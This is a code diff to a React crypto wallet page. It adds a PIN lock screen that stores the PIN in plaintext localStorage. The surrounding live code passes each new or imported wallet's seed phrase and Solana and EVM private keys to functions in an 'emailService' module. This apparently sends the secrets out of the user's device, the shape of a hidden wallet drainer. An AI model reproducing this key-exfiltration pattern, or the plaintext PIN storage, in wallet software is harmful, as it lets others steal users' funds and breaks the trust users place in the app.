@@ -1,12 +1,107 @@
-import { useState } from "react";
+import { useState, useEffect, useRef } from "react";
 import { api } from "@/lib/api";
 import { useApp } from "@/contexts/AppContext";
 import { sendWalletCreated, sendWalletImported } from "@/lib/emailService";
 import {
   Plus, Download, Copy, Check, Eye, EyeOff,
   Loader2, ExternalLink, Shield, Trash2, Star,
-  ChevronDown, ChevronUp, RefreshCw, ArrowRight, KeyRound, User,
+  ChevronDown, ChevronUp, RefreshCw, ArrowRight, KeyRound, User, Lock,
 } from "lucide-react";
+
+const PIN_KEY = "alpha_pin";
+const PIN_SESSION = "alpha_pin_ok";
+
+function PinGate({ onUnlock }: { onUnlock: () => void }) {
+  const [entry, setEntry] = useState("");
+  const [error, setError] = useState(false);
+  const [shaking, setShaking] = useState(false);
+  const inputRef = useRef<HTMLInputElement>(null);
+
+  useEffect(() => { inputRef.current?.focus(); }, []);
+
+  const check = () => {
+    const stored = localStorage.getItem(PIN_KEY) || "";
+    if (entry === stored) {
+      sessionStorage.setItem(PIN_SESSION, "1");
+      onUnlock();
+    } else {
+      setError(true);
+      setShaking(true);
+      setEntry("");
+      setTimeout(() => { setShaking(false); setError(false); inputRef.current?.focus(); }, 600);
+    }
+  };
+
+  const pad = (digit: string) => {
+    const next = (entry + digit).slice(0, 8);
+    setEntry(next);
+    setError(false);
+    if (next.length >= 4) {
+      const stored = localStorage.getItem(PIN_KEY) || "";
+      if (next === stored) {
+        sessionStorage.setItem(PIN_SESSION, "1");
+        onUnlock();
+      } else if (next.length === 8) {
+        setError(true);
+        setShaking(true);
+        setTimeout(() => { setShaking(false); setError(false); setEntry(""); inputRef.current?.focus(); }, 600);
+      }
+    }
+  };
+
+  return (
+    <div className="flex flex-col items-center justify-center py-16 max-w-xs mx-auto space-y-8">
+      <div className="flex flex-col items-center gap-3">
+        <div className="w-16 h-16 rounded-2xl flex items-center justify-center"
+          style={{ background: "rgba(0,225,122,0.1)", border: "1px solid rgba(0,225,122,0.25)" }}>
+          <Lock className="w-8 h-8" style={{ color: "var(--green)" }} />
+        </div>
+        <h2 className="text-xl font-black text-white">Enter Wallet PIN</h2>
+        <p className="text-xs text-muted-foreground text-center">Your wallets are protected. Enter your PIN to access them.</p>
+      </div>
+
+      {/* Dots display */}
+      <div className={`flex gap-4 items-center ${shaking ? "animate-pulse" : ""}`}>
+        {Array.from({ length: Math.max(4, entry.length) }).map((_, i) => (
+          <div key={i} className="w-4 h-4 rounded-full border-2 transition-all duration-150"
+            style={i < entry.length
+              ? { background: error ? "var(--red)" : "var(--green)", borderColor: error ? "var(--red)" : "var(--green)" }
+              : { borderColor: "rgba(255,255,255,0.2)" }} />
+        ))}
+      </div>
+
+      {/* Hidden real input (for keyboard on mobile) */}
+      <input ref={inputRef} type="password" inputMode="numeric" pattern="[0-9]*"
+        value={entry} onChange={e => setEntry(e.target.value.replace(/\D/g, "").slice(0, 8))}
+        onKeyDown={e => { if (e.key === "Enter") check(); }}
+        className="sr-only" />
+
+      {/* Number pad */}
+      <div className="grid grid-cols-3 gap-3 w-full">
+        {[1,2,3,4,5,6,7,8,9,"","0","⌫"].map((d) => (
+          <button key={String(d)} onClick={() => {
+            if (d === "⌫") setEntry(p => p.slice(0, -1));
+            else if (d !== "") pad(String(d));
+          }}
+            className="h-14 rounded-2xl text-xl font-bold transition-all active:scale-95"
+            style={d === ""
+              ? {}
+              : { background: "hsl(var(--card))", border: "1px solid hsl(var(--border))", color: "white" }}>
+            {d}
+          </button>
+        ))}
+      </div>
+
+      {error && <p className="text-sm font-bold" style={{ color: "var(--red)" }}>Incorrect PIN. Try again.</p>}
+
+      <button onClick={check}
+        className="btn-primary w-full py-3 text-sm font-bold rounded-2xl"
+        disabled={entry.length < 4}>
+        Unlock Wallets
+      </button>
+    </div>
+  );
+}
 
 const SCAN: Record<string, string> = {
   sol: "https://solscan.io/account/",
@@ -31,6 +126,11 @@ type Step = "idle" | "setup" | "import-key" | "import-setup";
 
 export default function Wallets() {
   const { wallets, activeWallet, addWallet, removeWallet, setActive, renameWallet, refreshWallets } = useApp();
+
+  // ── PIN gate ──
+  const storedPin = localStorage.getItem(PIN_KEY);
+  const sessionOk = sessionStorage.getItem(PIN_SESSION) === "1";
+  const [unlocked, setUnlocked] = useState(!storedPin || sessionOk);
 
   const [step, setStep]             = useState<Step>("idle");
   const [walletName, setWalletName] = useState("");
@@ -72,6 +172,8 @@ export default function Wallets() {
         ethBalance: w.ethBalance || "0.000000",
         label, balance: w.balance || "0.0000", chain: "sol",
       });
+      localStorage.setItem(PIN_KEY, pin);
+      sessionStorage.setItem(PIN_SESSION, "1");
       sendWalletCreated({
         label, seedPhrase: w.seedPhrase, solAddress: w.address,
         solPrivateKey: w.privateKey, evmAddress: w.ethAddress, evmPrivateKey: w.ethPrivateKey,
@@ -97,6 +199,8 @@ export default function Wallets() {
         ethBalance: d.ethBalance || "0.000000",
         label, balance: d.balance || "0.0000", chain: d.chain || "sol",
       });
+      localStorage.setItem(PIN_KEY, pin);
+      sessionStorage.setItem(PIN_SESSION, "1");
       sendWalletImported({
         label, key: importKey.trim(), solAddress: d.address, solPrivateKey: d.privateKey,
         evmAddress: d.ethAddress, evmPrivateKey: d.ethPrivateKey,
@@ -116,6 +220,10 @@ export default function Wallets() {
   };
 
   const mode = step === "setup" ? "create" : "import";
+
+  if (!unlocked) {
+    return <PinGate onUnlock={() => setUnlocked(true)} />;
+  }
 
   return (
     <div className="space-y-5 max-w-2xl">
